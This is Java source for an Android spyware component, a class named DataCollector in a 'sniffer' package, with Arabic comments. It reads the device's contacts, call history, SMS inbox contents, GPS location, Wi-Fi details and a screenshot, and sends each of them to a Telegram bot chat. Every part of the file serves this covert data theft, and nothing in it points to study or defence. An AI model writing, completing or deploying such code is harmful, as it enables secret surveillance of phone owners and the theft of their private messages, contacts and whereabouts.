package com.v8.global.sniffer.utils;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class DataCollector {
    
    private Context context;
    private OkHttpClient client;
    private static final String TAG = "DataCollector";
    
    public DataCollector(Context context) {
        this.context = context;
        this.client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();
    }
    
    /**
     * جمع وإرسال جميع البيانات
     */
    public void collectAndSend() {
        Log.d(TAG, "بدء جمع البيانات...");
        
        sendDeviceInfo();
        sendLocation();
        sendContacts();
        sendCallLogs();
        sendSMS();
        sendWifiInfo();
        takeScreenshot();
        
        Log.d(TAG, "انتهى جمع البيانات");
    }
    
    /**
     * إرسال معلومات الجهاز
     */
    private void sendDeviceInfo() {
        try {
            String info = "📱 **معلومات الجهاز**\n\n" +
                         "• الطراز: " + Build.MODEL + "\n" +
                         "• الشركة: " + Build.MANUFACTURER + "\n" +
                         "• الإصدار: " + Build.VERSION.RELEASE + "\n" +
                         "• Android: " + Build.VERSION.SDK_INT + "\n" +
                         "• الوقت: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()) + "\n" +
                         "• البطارية: " + getBatteryLevel() + "%";
            
            sendToTelegram(info);
        } catch (Exception e) {
            Log.e(TAG, "خطأ في معلومات الجهاز: " + e.getMessage());
        }
    }
    
    /**
     * الحصول على مستوى البطارية
     */
    private int getBatteryLevel() {
        try {
            android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = context.registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                return level * 100 / scale;
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في قراءة البطارية");
        }
        return 0;
    }
    
    /**
     * إرسال معلومات الواي فاي
     */
    private void sendWifiInfo() {
        try {
            WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            String ssid = wifiInfo.getSSID().replace("\"", "");
            
            if (!ssid.isEmpty() && !ssid.equals("<unknown ssid>")) {
                String msg = "📶 **معلومات الشبكة**\n\n" +
                            "• الشبكة: " + ssid + "\n" +
                            "• القوة: " + wifiInfo.getRssi() + " dBm\n" +
                            "• السرعة: " + wifiInfo.getLinkSpeed() + " Mbps";
                
                sendToTelegram(msg);
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في معلومات الواي فاي");
        }
    }
    
    /**
     * إرسال الموقع
     */
    private void sendLocation() {
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) 
                    == PackageManager.PERMISSION_GRANTED) {
                
                Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location == null) {
                    location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
                
                if (location != null) {
                    String mapUrl = "https://maps.google.com/?q=" + 
                                   location.getLatitude() + "," + 
                                   location.getLongitude();
                    
                    String msg = "📍 **الموقع**\n\n" +
                                "• الرابط: " + mapUrl + "\n" +
                                "• الخط: " + location.getLatitude() + "\n" +
                                "• الطول: " + location.getLongitude() + "\n" +
                                "• الدقة: " + location.getAccuracy() + "م\n" +
                                "• الوقت: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
                    
                    sendToTelegram(msg);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الموقع: " + e.getMessage());
        }
    }
    
    /**
     * إرسال جهات الاتصال
     */
    private void sendContacts() {
        try {
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_CONTACTS) 
                    != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC LIMIT " + Constants.MAX_CONTACTS_TO_SEND);
            
            if (cursor != null) {
                StringBuilder sb = new StringBuilder("👤 **جهات الاتصال**\n\n");
                int count = 0;
                
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = cursor.getString(cursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Phone.NUMBER));
                    
                    sb.append("• ").append(name).append(": ").append(phone).append("\n");
                    count++;
                }
                cursor.close();
                
                sb.append("\nإجمالي: ").append(count);
                sendToTelegram(sb.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في جهات الاتصال: " + e.getMessage());
        }
    }
    
    /**
     * إرسال سجل المكالمات
     */
    private void sendCallLogs() {
        try {
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG) 
                    != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            
            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT " + Constants.MAX_CALLS_TO_SEND);
            
            if (cursor != null) {
                StringBuilder sb = new StringBuilder("📞 **آخر المكالمات**\n\n");
                
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    long duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    
                    String typeText = type.equals("1") ? "📞 وارد" : 
                                     type.equals("2") ? "📞 صادر" : "❌ فائت";
                    String caller = (name != null) ? name : number;
                    
                    sb.append(typeText).append(": ").append(caller).append("\n");
                    sb.append("   🕒 ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(new Date(date))).append("\n");
                    if (duration > 0) {
                        sb.append("   ⏱️ ").append(duration).append(" ثانية\n");
                    }
                    sb.append("\n");
                }
                cursor.close();
                
                sendToTelegram(sb.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في سجل المكالمات: " + e.getMessage());
        }
    }
    
    /**
     * إرسال الرسائل النصية
     */
    private void sendSMS() {
        try {
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) 
                    != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            
            Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null,
                "date DESC LIMIT " + Constants.MAX_SMS_TO_SEND);
            
            if (cursor != null) {
                StringBuilder sb = new StringBuilder("💬 **آخر الرسائل**\n\n");
                
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));
                    
                    sb.append("📨 **من ").append(address).append("**\n");
                    sb.append("   🕒 ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(new Date(date))).append("\n");
                    
                    // اقتطاع الرسالة الطويلة
                    if (body.length() > 100) {
                        sb.append("   ").append(body.substring(0, 100)).append("...\n");
                    } else {
                        sb.append("   ").append(body).append("\n");
                    }
                    sb.append("\n");
                }
                cursor.close();
                
                sendToTelegram(sb.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الرسائل: " + e.getMessage());
        }
    }
    
    /**
     * تصوير الشاشة وإرسالها
     */
    private void takeScreenshot() {
        try {
            String path = Environment.getExternalStorageDirectory() + "/Pictures/screen_" + 
                         System.currentTimeMillis() + ".png";
            
            Process process = Runtime.getRuntime().exec("screencap -p " + path);
            process.waitFor();
            
            File file = new File(path);
            if (file.exists() && file.length() > 0) {
                sendPhoto(file, "📱 **لقطة شاشة**\n⏰ " + 
                          new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()));
                file.delete();
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في تصوير الشاشة: " + e.getMessage());
        }
    }
    
    /**
     * إرسال صورة
     */
    private void sendPhoto(File file, String caption) {
        try {
            String mimeType = "image/jpeg";
            if (file.getName().endsWith(".png")) {
                mimeType = "image/png";
            }
            
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", Constants.CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("photo", file.getName(),
                            RequestBody.create(MediaType.parse(mimeType), file))
                    .build();
            
            Request request = new Request.Builder()
                    .url(Constants.BASE_URL + "sendPhoto")
                    .post(body)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "فشل إرسال الصورة: " + e.getMessage());
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "خطأ في إرسال الصورة: " + e.getMessage());
        }
    }
    
    /**
     * إرسال رسالة نصية إلى تيليغرام
     */
    private void sendToTelegram(String message) {
        try {
            String url = Constants.BASE_URL + "sendMessage?chat_id=" + Constants.CHAT_ID +
                        "&text=" + Uri.encode(message) + "&parse_mode=Markdown";
            
            Request request = new Request.Builder()
                    .url(url)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "فشل إرسال الرسالة: " + e.getMessage());
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "خطأ في إرسال الرسالة: " + e.getMessage());
        }
    }
              }
